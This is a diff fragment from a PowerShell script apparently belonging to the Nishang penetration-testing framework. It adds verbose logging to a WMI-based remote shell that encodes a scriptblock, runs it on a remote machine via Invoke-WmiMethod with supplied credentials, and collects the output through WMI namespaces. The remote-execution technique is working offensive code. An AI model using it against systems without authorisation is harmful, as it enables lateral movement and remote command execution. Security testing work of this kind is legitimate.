@@ -125,7 +125,7 @@ https://github.com/samratashok/nishang
                 Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
             }
             default { 
-                Write-Verbose "Executing given command on $ComputerName"
+                Write-Verbose "Sending given command to a scriptblock"
                 $RemoteScript = @"
                 Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                 `$WScriptShell = New-Object -c WScript.Shell
@@ -153,6 +153,9 @@ https://github.com/samratashok/nishang
 	                Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded 
 	                Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
 "@
+                
+                
+                Write-Verbose "Creating Scriptblock to execute on $ComputerName"
                 $ScriptBlock = [scriptblock]::Create($RemoteScript)
                 
                 # Compress and Encode the scriptblock
@@ -193,12 +196,14 @@ https://github.com/samratashok/nishang
 
                 
                 $EncodedPosh = "powershell.exe -e $EncodedScript"
-                $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh
+                Write-Verbose "Executing scriptblock on $ComputerName"
+                Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh | Out-Null
                     
                 # Wait for script to finish writing output to WMI namespaces
                 $outputReady = ""
                 do
                 {
+                    Write-Verbose "Waiting for the scriptblock on $ComputerName to finish executing."
                     $outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"
                 }
                 until($outputReady)
@@ -242,7 +247,7 @@ function Get-WmiShellOutput
     {
 		
 	    $Reconstructed = New-Object System.Text.StringBuilder
-
+        Write-Verbose "Decoding the encoded output."
         #Decode Base64 output
 		foreach ($line in $GetOutput) 
         {
